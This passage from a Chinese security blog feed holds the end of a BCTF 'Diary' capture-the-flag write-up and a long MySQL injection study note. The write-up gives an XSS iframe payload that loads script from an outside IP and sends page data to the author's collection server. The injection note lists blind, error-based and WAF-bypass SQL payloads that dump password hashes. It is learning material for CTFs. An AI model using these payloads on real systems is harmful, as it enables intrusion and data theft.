class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p><p>留意登陆我们账户的过程，正常登陆过程是向auth域内的认证页面发送请求，验证auth域登陆状态后发送code回去，但这里我们auth域的登陆状态是admin的，所以这里我们直接跳过第一个url，直接向diary域发送由auth下发的代表我们自己账户的code，那code怎么来呢？通过burp抓包就可以了，注意burp中要把那个发送code的请求拦下来晾在那里不要发出去，这样我们就成功的让admin以我们自己的身份登陆了，之后将admin浏览器定位到第二个xss点</p><p>这里的我们我们要做的任务就是将admin重新登陆自己的账户，并POST表单来拿flag，这里怎么登陆呢，其实很简单，我们直接向auth域发送登陆请求就可以了，因为admin浏览器的auth域一直都在以admin的身份登陆着，所以下发的code就可以让admin登陆回自己的diary域。之后就是通过xhr提交表单请求，并发送页面反馈信息回自己的xss平台拿到flag<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">第二个xss点，跳转到post.js执行js代码</div><div class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">"&lt;script src='http://diary.bctf.xctf.org.cn/static/js/jquery.min.js'&gt;&lt;/script&gt;&lt;script src='http://104.160.43.154:8000/myjs/post.js'&gt;&lt;/script&gt;"</span>&gt;</span></div></pre></td></tr></table></figure></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">post.js</div><div class="line"><span class="keyword">var</span> loginIframe = <span class="built_in">window</span>.top.document.createElement(<span class="string">'iframe'</span>);</div><div class="line">loginIframe.setAttribute(<span class="string">'src'</span>, <span class="string">'http://104.160.43.154:8000/myjs/in_and_out.html'</span>);</div><div class="line"><span class="built_in">window</span>.top.document.body.appendChild(loginIframe);</div><div class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    $.post(<span class="string">"http://diary.bctf.xctf.org.cn/survey/"</span>,</div><div class="line">        &#123;</div><div class="line">            <span class="attr">rate</span>:<span class="string">'5'</span>,</div><div class="line">            <span class="attr">suggestion</span>:<span class="string">'123'</span>,</div><div class="line">            <span class="attr">csrfmiddlewaretoken</span>:<span class="built_in">document</span>.cookie.split(<span class="string">';'</span>)[<span class="number">0</span>].split(<span class="string">'='</span>)[<span class="number">1</span>]</div><div class="line">           &#125;,</div><div class="line">        <span class="function"><span class="keyword">function</span> (<span class="params">data</span>)</span>&#123;</div><div class="line">            $.get(<span class="string">"http://xss平台?a="</span>+<span class="built_in">escape</span>(data),functoon(data,status)&#123;&#125;);</div><div class="line">        &#125;</div><div class="line">    );</div><div class="line">&#125;, <span class="number">6000</span>);</div></pre></td></tr></table></figure><h2 id="一点感想"><a href="#一点感想" class="headerlink" title="一点感想"></a>一点感想</h2><p>xss题目一直是比赛中必出的一类题，玩法多样有趣，我从今年三月份开始打ctf并学习xss到现在，xss题目没做多少，也就是0ctf里那两道以及bctf这一道，还有看各路大佬打pwnhub后写的xss题目的wp，但笔记就已经做了万把字了，主要原因还是在于xss题目trick极多，比较难入手，（不过还是同意wupco师傅说的，自己菜才是原罪2333）。等到有一天觉得自己对xss了解的够多了，就把这一路的笔记发出来，毕竟相比sql注入啥的漏洞，xss的学习资源更少，逻辑也更绕，手法也更多样，哎算了，就我的xss水平还是先别立flag了，先踏实做吧。<br>对了，每次做xss题目，输入payload然后盯着自己的xss平台等访问请求的那种感觉真的是贼爽，如果真的接收到了发过来的访问就感觉和中了彩票一样高兴，我想这也是支持我去一点点的学习xss的主要原因吧。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;说起来是因为对BCTF的Dairy题目重新复习才写了这篇笔记，原谅我当时没吃透这道题的原理，近日看Ven师傅的wp中提到了OAuth授权，才意识到出这道题目的用意。。。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>mysql注入学习（持续保持更新）</title>
    <link href="https://someonesometimes.github.io/2017/07/23/mysql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD%EF%BC%89/"/>
    <id>https://someonesometimes.github.io/2017/07/23/mysql注入学习（持续更新中）/</id>
    <published>2017-07-23T05:53:32.000Z</published>
    <updated>2017-11-03T13:04:35.552Z</updated>
    
    <content type="html"><![CDATA[<ul><li>对ctf题目中盲注思路以及waf绕过的总结</li><li>sqlmap的参数学习（算了不写了，直接看小m师傅的吧，文笔比我好多了。。<a href="http://www.melodia.pw/?p=918" title="SQLMAP 人工辅助注入简介" target="_blank" rel="external">http://www.melodia.pw/?p=918</a>）</li><li>其他不好分类的，零碎想记录的<a id="more"></a></li></ul><h2 id="第一步：字符串截取函数"><a href="#第一步：字符串截取函数" class="headerlink" title="第一步：字符串截取函数"></a>第一步：字符串截取函数</h2><p><em>选取那个完全由过滤了什么符号决定，一般查看的有：函数名，逗号，空格</em><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">substring((<span class="keyword">select</span> xxx) <span class="keyword">from</span> <span class="number">-1</span>|<span class="number">-2</span>|<span class="number">-3.</span>.. <span class="keyword">for</span> <span class="number">1</span>)</div><div class="line"><span class="keyword">substr</span>((<span class="keyword">select</span> xxx) <span class="keyword">from</span> <span class="number">-1</span>|<span class="number">-2</span>|<span class="number">-3.</span>.. <span class="keyword">for</span> <span class="number">1</span>)</div><div class="line"><span class="keyword">mid</span>((<span class="keyword">select</span> xxx) <span class="keyword">from</span> <span class="number">-1</span>|<span class="number">-2</span>|<span class="number">-3.</span>.. <span class="keyword">for</span> <span class="number">1</span>)</div><div class="line">过滤少的时候可以使用((<span class="keyword">select</span> xxx),<span class="number">1</span>|<span class="number">2</span>|<span class="number">3.</span>..,<span class="number">1</span>)的原始形式</div><div class="line"></div><div class="line"><span class="keyword">left</span>((<span class="keyword">select</span> xxx),<span class="number">2</span>)</div><div class="line"><span class="keyword">right</span>((<span class="keyword">select</span> xxx),<span class="number">2</span>)</div><div class="line"><span class="keyword">right</span>(<span class="keyword">left</span>((<span class="keyword">select</span> xxx),<span class="number">1</span>|<span class="number">2</span>|<span class="number">3.</span>..),<span class="number">1</span>)</div></pre></td></tr></table></figure></p><h2 id="第二步：将截取到的字符串段进行比较得到另一个数据"><a href="#第二步：将截取到的字符串段进行比较得到另一个数据" class="headerlink" title="第二步：将截取到的字符串段进行比较得到另一个数据"></a>第二步：将截取到的字符串段进行比较得到另一个数据</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">substring [=|like] [''|0xxxx]本身的结果就已经是用0，1 表示了</div><div class="line">(if(substring [=|like] [''|0xxxx], 0,1))</div><div class="line">(<span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> (<span class="keyword">substring</span> [=|<span class="keyword">like</span>] [<span class="string">''</span>|<span class="number">0</span>xxxx]) <span class="keyword">then</span> <span class="number">0</span> <span class="keyword">else</span> <span class="number">1</span> <span class="keyword">end</span>)</div><div class="line"></div><div class="line">使用<span class="built_in">binary</span>()来比较，来区分大小写</div></pre></td></tr></table></figure><h2 id="第三步：产生两种结果"><a href="#第三步：产生两种结果" class="headerlink" title="第三步：产生两种结果"></a>第三步：产生两种结果</h2><h3 id="基于bool的盲注"><a href="#基于bool的盲注" class="headerlink" title="基于bool的盲注"></a>基于bool的盲注</h3><p>判断结果的0或1或产生两种不同的回显结果，这就是bool型盲注思路<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">where user='' or [0|1] and ''=''  三者作为比较运算的条件</div><div class="line">where user='0'+[0|1]+'0'三者作为运算结果，如果为'0'将匹配所有字符串，如果为'1'则匹配不了字符串，能够省略and等运算符</div></pre></td></tr></table></figure></p><h3 id="基于time的盲注"><a href="#基于time的盲注" class="headerlink" title="基于time的盲注"></a>基于time的盲注</h3><p>如果满足条件就sleep上一段时间，如果没有就不sleep，然后通过计算处理时间来得到两种回显结果<br>一般insert语句这种不会有文字回显的采用基于time盲注的两种情况<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#需要注意一点的是，这里的重点不是让条件等式的结果为0或1，只要让等式中sleep的那一段运行就好</div><div class="line">where user='1' and [1,|sleep(5)]%23</div></pre></td></tr></table></figure></p><h3 id="基于报错的盲注"><a href="#基于报错的盲注" class="headerlink" title="基于报错的盲注"></a>基于报错的盲注</h3><p><strong>需要注意的一点是，既然数据库会报错回显，本质上和只有两种回显的情况是有不同的，在精心构造的语句+低版本的数据库中是可能直接拿到数据而不用盲注的，有关于报错的分类以及直接拿数据的方法我们在后面都会介绍到，这里只是盲注中对基于报错的使用</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">#利用函数传入参数的格式错误报错</div><div class="line">select 1 from users where user='' or [0/1] and ST_LatFromGeoHash(version())%23;</div><div class="line">#利用exp函数的运算溢出可以造成报错，从710开始就会报错了，~0，，~1等等也都是可以的</div><div class="line">select 1 from users where user='' or [0/1] or exp(~0)</div><div class="line">#利用支持运算的最大值构造报错，这里的0就是按位取反得到的最大值，也就是18446744073709551615</div><div class="line">select 1 from users where user='' or [0/1] or ~0+1</div></pre></td></tr></table></figure><h3 id="还有一些有意思的产生两种回显的trick"><a href="#还有一些有意思的产生两种回显的trick" class="headerlink" title="还有一些有意思的产生两种回显的trick"></a>还有一些有意思的产生两种回显的trick</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">这种写法适用于这么一种情况：</div><div class="line">可以通过where的条件控制要的那一行，只是里面的有些列 不回显，或者全都不回显，如果用盲注的话又限制了from，比较函数等标签，这时候就可以使用这种union来比对出来</div><div class="line">where user='admin' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span> <span class="keyword">desc</span>;   </div><div class="line">这种方式通过union一个<span class="keyword">select</span>来使得输出表产生两行，然后因为自动排序的原因导致第一行总是最小值，</div><div class="line">所以这就产生了两种情况</div></pre></td></tr></table></figure><h2 id="基于报错的注入分类以及非盲注的方法介绍"><a href="#基于报错的注入分类以及非盲注的方法介绍" class="headerlink" title="基于报错的注入分类以及非盲注的方法介绍"></a>基于报错的注入分类以及非盲注的方法介绍</h2><p><strong>首先来了解下如何从报错信息中直接拿到我们要的数据而不用盲注，之后在对报错注入的分类的介绍中我们会附加上如何不用盲注拿数据的payload</strong></p><p>让我们从exp(~0)这个报错函数开始考虑，报错时显示</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~(0))'</div></pre></td></tr></table></figure><p>看，回显中有显示~0的字样，然后我们可以想到如果是多层嵌套结构的话是分层次执行，如果我们用<code>select user()</code>来代替0，那么执行的顺序就是先进行<code>select user()</code>语句然后再将返回值带入exp函数中执行，最后报错的时候也就会将我们已经执行完毕的那条语句的执行结果输出出来，这时我们就看到了结果</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((<span class="keyword">select</span> <span class="string">'root@localhost'</span> <span class="keyword">from</span> dual)))<span class="string">'</span></div></pre></td></tr></table></figure><p>OK，了解了原理，我们接下来就要介绍报错盲注的分类了</p><h3 id="5-7版本以上mysql函数"><a href="#5-7版本以上mysql函数" class="headerlink" title="5.7版本以上mysql函数"></a>5.7版本以上mysql函数</h3><p>注意，我们下面介绍的这些函数在5.7版本中才有，而且经过测试能够回显敏感信息</p><p>而很多低版本的mysql都只能报错而在错误信息中不显示关键信息了，所以在高版本mysql中就推荐用这些函数</p><p>下面介绍的这些函数有个共性就是报错都是基于他们传入的参数格式错误而造成的，报错信息中就会展示出错误信息</p><p><code>ST_LatFromGeoHash()</code>函数，参数只能接受纯数字，我们用group_concat()引入逗号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> ST_LatFromGeoHash((<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">user</span>));</div><div class="line">output:</div><div class="line">Incorrect geohash value: 'dd9d15d993d6f42f896ab4ba09a6a695,56057a4f4e475d73e48824acf8b54098,6b9412ec641f16892544154952fc8b1d' for function ST_LATFROMGEOHASH</div></pre></td></tr></table></figure><p><code>ST_LongFromGeoHash()</code>函数是一样的效果</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> ST_LongFromGeoHash((<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">user</span>));</div><div class="line">output:</div><div class="line">ERROR 1411 (HY000): Incorrect geohash value: 'dd9d15d993d6f42f896ab4ba09a6a695,56057a4f4e475d73e48824acf8b54098,6b9412ec641f16892544154952fc8b1d' for function ST_LONGFROMGEOHASH</div></pre></td></tr></table></figure><p>然后是<code>GTID_SUBSET()</code>函数，这个函数需要传两个参数，但是构造的时候注意到使用<code>select GTID_SUBSET((select group_concat(password) from user),&#39;&#39;);</code>并没有报错，然后就瞎猜了下，使用<code>concat</code>字符串链接将其处理一下，然后就成功报错了，迷。。。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> GTID_SUBSET(<span class="keyword">concat</span>((<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">user</span>),<span class="string">''</span>),<span class="string">''</span>);</div><div class="line">output:</div><div class="line">ERROR 1772 (HY000): Malformed GTID <span class="keyword">set</span> specification <span class="string">'dd9d15d993d6f42f896ab4ba09a6a695,56057a4f4e475d73e48824acf8b54098,6b9412ec641f16892544154952fc8b1d'</span>.</div></pre></td></tr></table></figure><p><code>GTID_SUBTRACT()</code>函数与上一个是同样的触发方式</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="keyword">GTID_SUBTRACT</span>(<span class="keyword">concat</span>((<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">user</span>),<span class="string">''</span>),<span class="string">''</span>);</div><div class="line">output:</div><div class="line">ERROR 1772 (HY000): Malformed GTID <span class="keyword">set</span> specification <span class="string">'dd9d15d993d6f42f896ab4ba09a6a695,56057a4f4e475d73e48824acf8b54098,6b9412ec641f16892544154952fc8b1d'</span>.</div></pre></td></tr></table></figure><p><code>ST_PointFromGeoHash()</code>函数，需要两个参数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> ST_PointFromGeoHash((<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">user</span>),<span class="number">1</span>);</div><div class="line">output:</div><div class="line">ERROR 1411 (HY000): Incorrect geohash value: 'dd9d15d993d6f42f896ab4ba09a6a695,56057a4f4e475d73e48824acf8b54098,6b9412ec641f16892544154952fc8b1d' for function st_pointfromgeohash</div></pre></td></tr></table></figure><h3 id="低版本报错方式"><a href="#低版本报错方式" class="headerlink" title="低版本报错方式"></a>低版本报错方式</h3><p>在低版本中，这些报错方式大都还是能将敏感信息回显出来的，高版本mysql里就不行了，我这里只有5.7版本的mysql，很多报错方式不会再回显敏感信息了，所以这里就只提供报错语句及原理介绍吧</p><p><strong>基于运算溢出的报错</strong></p><p>int型的加法运算溢出报错</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> ~<span class="number">0</span>+<span class="number">1</span>;</div><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> ~(<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">user</span>)+<span class="number">1</span>;</div></pre></td></tr></table></figure><p>exp()指数运算溢出，实际上在参数为710及以上时候就会溢出了</p><p>有个比较有意思的点，我在5.7版本的mysql测试中看到，回显信息包括了所有的字段名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">exp</span>(<span class="number">710</span>);</div><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">exp</span>(~(<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">user</span>));</div></pre></td></tr></table></figure><p><strong>其他函数</strong></p><p>比较有意思的是，我在高版本mysql测试中，虽然不回显敏感信息了，但会爆出来表中所有的字段名。。。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> multipoint((<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">user</span>));</div><div class="line">output:</div><div class="line">ERROR 1367 (22007): Illegal non geometric '(<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="string">`blog`</span>.<span class="string">`user`</span>.<span class="string">`password`</span> separator <span class="string">','</span>) <span class="keyword">from</span> <span class="string">`blog`</span>.<span class="string">`user`</span>)<span class="string">' value found during parsing</span></div></pre></td></tr></table></figure><p>函数比较多，用法也都比较简单，这里就不一一举例了</p><ul><li>geometrycollection()</li><li>multipoint()</li><li>polygon()</li><li>multipolygon()</li><li>linestring() </li><li>multilinestring() </li></ul><p><strong>在高版本测试中也可以爆出敏感信息的函数</strong></p><p><code>updatexml()</code>函数是mysql中用来修改xml信息的函数</p><p><code>extractvalue()</code>函数是mysql中用来查询xml信息的函数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">有时候可能爆不全，不全的时候用limit offset按行取吧</div><div class="line">有时候还容易出问题，尝试使用第二行的写法，将计算结果左右连接上~</div><div class="line"><span class="keyword">select</span> updatexml(<span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">user</span>),<span class="number">1</span>);</div><div class="line"><span class="keyword">select</span> extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">user</span>),<span class="number">0x7e</span>));</div><div class="line">output:</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: '~dd9d15d993d6f42f896ab4ba09a6a69</div></pre></td></tr></table></figure><p><strong>基于主键重复的报错</strong></p><p>报错原因网上有比较详细的分析，涉及到mysql执行这条语句时候的具体过程，需要的时候可以再去学习</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">select count(*),concat((select group_concat(password) from user),floor(rand(0)*2))x from information_schema.tables group by x;</div><div class="line">output:</div><div class="line">ERROR 1062 (23000): Duplicate entry 'dd9d15d993d6f42f896ab4ba09a6a695,56057a4f4e475d73e48824acf8b5409' for key '&lt;group_key&gt;'</div></pre></td></tr></table></figure><h2 id="sql过滤统计"><a href="#sql过滤统计" class="headerlink" title="sql过滤统计"></a>sql过滤统计</h2><p>反正过滤吧，不是想办法绕过，就是再找一个相同功能的写法来替换<br>先放上一些比较经典的：</p><ul><li><a href="https://xianzhi.aliyun.com/forum/read/349.html" target="_blank" rel="external">我的WafBypass之道</a></li></ul><p><strong>过滤单引号</strong></p><ul><li>在数据库为gbk编码下可以考虑宽字节注入%df%27来用%df吃掉\</li><li>因为单引号被过滤无法<code>where user=&#39;admin&#39;</code>的时候，用0x写法来代替’’写法</li></ul><p><strong>过滤空格</strong><br>本质上就是用一些无法融入原写法语义的符号放到那里起到空格的分隔作用</p><ul><li>使用<code>()</code>来做分隔,形如select(*)from(user)的写法，</li><li>sqlmap中space2hash.py的方法，用%23xxx%0a来做空格</li><li>使用<code>/**/</code>来做分隔</li><li>使用%0a来做分隔</li></ul><p><strong>过滤某些sql语句的关键字</strong></p><ul><li><code>/*!*/</code>来在php中注释过去，但是mysql中会正常执行，形如<code>/*!select*/ flag /*!from*/ flag</code></li><li>中间插入<code>%0a  %0b  %00  /**/</code>这些,形如<code>se%0blect fl/**/ag from flag</code>，但有一点要提醒的是，<code>sel/**/ect</code>这种写法并不是说可以绕过检测而且mysql可以执行，<code>%0b /**/</code>这些字符在sql语句中是存在的，在php那一层就会剔除掉</li><li>考虑大小写绕过SeLect</li><li>最常见的双写绕过的可能千万不要忘了尝试下 <code>selselelctect</code></li></ul><p><strong>过滤某些符号</strong><br>符号的过滤与关键字过滤不同，大部分情况无法进行过滤绕过，多为寻求符号的替代品</p><ul><li>使用greatest来替代大小写符号<code>ascii(mid(user(),1,1)) &lt; 150</code>–&gt;<code>greatest(ascii(mid(user(),1,1)),150)=150</code></li><li>过滤了逗号，使用<code>substring((select xxx) from -1|-2|-3... for 1)</code>来代替<code>((select xxx),1|2|3...,1)</code></li></ul><p><strong>末尾截断可用的注释（然而我比较习惯用’’=’）</strong></p><ul><li><code>%23  也就是#</code></li><li><code>--+</code>  注意这里应该用+来表示最后一个空格字符，因为很可能空格没有被传过去的</li><li><code>;%00</code></li><li><code>/*</code>没有测试成功</li><li>反撇号 没有测试成功</li></ul><p><strong>过滤某些函数</strong><br>这不是大事，基本上都能找到相同功能的函数来代替，mysql函数那么多。。。</p><p><strong>一些字段关键字被过滤</strong></p><ul><li>和关键子过滤一样，使用<code>/**/ %0b %0a</code>这些来中间断一下</li><li>大小写也是没有问题的，反正mysql对大小写也不敏感</li><li>使用concat(‘adm’+’in’)就可以，但注意mysql中写成’adm’+’in’的结果是0。。。小心不要错了</li></ul><h2 id="sql盲注的注意事项"><a href="#sql盲注的注意事项" class="headerlink" title="sql盲注的注意事项"></a>sql盲注的注意事项</h2><ul><li>最要紧的就是 = ‘i’或是0x表示，经常在payload里面写成 = {}，应该是 = ‘{}’</li><li>mysql的单字符比较中不区分大小写，应该使用binary()或者ascii()来区分大小写，测试ascii不管用，但是binary()可以</li><li>有一些很有意思的地方(从Ben师傅的一次padding oracle attack结合sql注入的时候在想：在对回车也就是%0a, \n 字符进行getcipher的时候，是写成%0a，还是\n呢？%0a的话，对应加密出三个字符，而\n这对应一个回车字符)：<br>在传递不可显示字符的时候，就比如回车符吧，我们有两种传递方式———将回车符用url编码，也就是写做%0a的形式，在到服务端接收的时候就会自动进行urldecode所以又是回车符了，这时候可能我们会想：在写php代码的时候，将回车符号写作\n  0x0a  \x0a啊这些也都可以在sql中正常运行，那么在作为参数传递时这样写行不行呢，其实是不行的，因为你传过去再输出就可以看到，这些符号的意义并没有被转化为回车符，而只是单纯的几个字符而已。<br>有一种情况特殊些，我们将字符串可以用0xxxxx来代替，但是这并不是在php里面能对0x进行解析为对应的字符，而是因为mysql支持这种字符串的书写格式。</li></ul><h2 id="sql盲注其他用到的点"><a href="#sql盲注其他用到的点" class="headerlink" title="sql盲注其他用到的点"></a>sql盲注其他用到的点</h2><ul><li>group_concat()将一列数据整合</li><li>获取数据库 <code>select database()</code></li><li>获取数据库中的表<br><code>select group_concat(table_name) from information_schema.tables where table_schema = &#39;news&#39;</code></li><li>获取表中的对应列<br><code>select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;</code> </li></ul><h2 id="无法使用information-schema下或者无法写column-name-table-name下获取库名表名列名"><a href="#无法使用information-schema下或者无法写column-name-table-name下获取库名表名列名" class="headerlink" title="无法使用information_schema下或者无法写column_name,table_name下获取库名表名列名"></a>无法使用information_schema下或者无法写column_name,table_name下获取库名表名列名</h2><h3 id="无法使用information-schema因而不知道列名-或者无法禁用列名相关字段"><a href="#无法使用information-schema因而不知道列名-或者无法禁用列名相关字段" class="headerlink" title="无法使用information_schema因而不知道列名,或者无法禁用列名相关字段"></a>无法使用information_schema因而不知道列名,或者无法禁用列名相关字段</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">union</span></div><div class="line"> <span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">1</span>)a,(<span class="keyword">select</span> <span class="number">2</span>)b,(<span class="keyword">select</span> <span class="number">3</span>)c,</div><div class="line">(<span class="keyword">select</span> e<span class="number">.4</span> <span class="keyword">from</span> (<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a,(<span class="keyword">select</span> <span class="number">2</span>)b,(<span class="keyword">select</span> <span class="number">3</span>)c,(<span class="keyword">select</span> <span class="number">4</span>)d <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span>)e <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">1</span>)d;</div></pre></td></tr></table></figure><p><strong>大致的解释：</strong><br>因为不能使用列名，所以通过语句<code>select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d union select * from user</code>来建立一个形如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">+------------------+----------------------------------+---------------------+-------+</div><div class="line">| 1                | 2                                | 3                   | 4     |</div><div class="line">+------------------+----------------------------------+---------------------+-------+</div><div class="line">| 1                | 2                                | 3                   | 4     |</div><div class="line">| SometimesSomeone | dd9d15d993d6f42f896ab4ba09a6a695 | 13512279197@163.com | user  |</div><div class="line">| 11               | 56057a4f4e475d73e48824acf8b54098 | 123@12              | user  |</div><div class="line">| admin            | 6b9412ec641f16892544154952fc8b1d | 13512279197@163.com | admin |</div><div class="line">+------------------+----------------------------------+---------------------+-------+</div></pre></td></tr></table></figure></p><p>这样的表，我们假设表叫e，之后<code>select e.3 from (e的建表语句) limit 1 offset 3</code>就可以的拿到admin那一行的密码，所以上述语句的返回结果是个变量，然后我们接着构造<br>还是使用<code>select (select 1)a,(select 2)b,(select 3)c,(select 4)d</code>的方法，把这个变量替换掉<code>(select 1)a</code>或者其他变量，所以现在拿到的就是一行数据<br>之后就可以用union来与之前的联系起来了</p><h3 id="通过构造错误拿到库名表名列名"><a href="#通过构造错误拿到库名表名列名" class="headerlink" title="通过构造错误拿到库名表名列名"></a>通过构造错误拿到库名表名列名</h3><p>1、<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username=<span class="string">'admin'</span>-c();</div><div class="line">output: ERROR 1305 (42000): FUNCTION blog.c does not exist</div><div class="line">成功拿到库名blog，因为一个库中存在不同的系统或自定义函数，若要调用的函数不存在，就会报出此数据库中</div><div class="line">没有这个函数</div></pre></td></tr></table></figure></p><p>2、<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username=<span class="string">''</span> <span class="keyword">and</span> Polygon(<span class="keyword">user</span>);</div><div class="line">output: ERROR 1367 (22007): Illegal non geometric '`blog`.`user`.`username`' </div><div class="line">value found during parsing</div><div class="line">可以成功爆出当前的库表列，比较不实用的就是需要猜中其中一个column的名字</div></pre></td></tr></table></figure></p><p>3、<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td 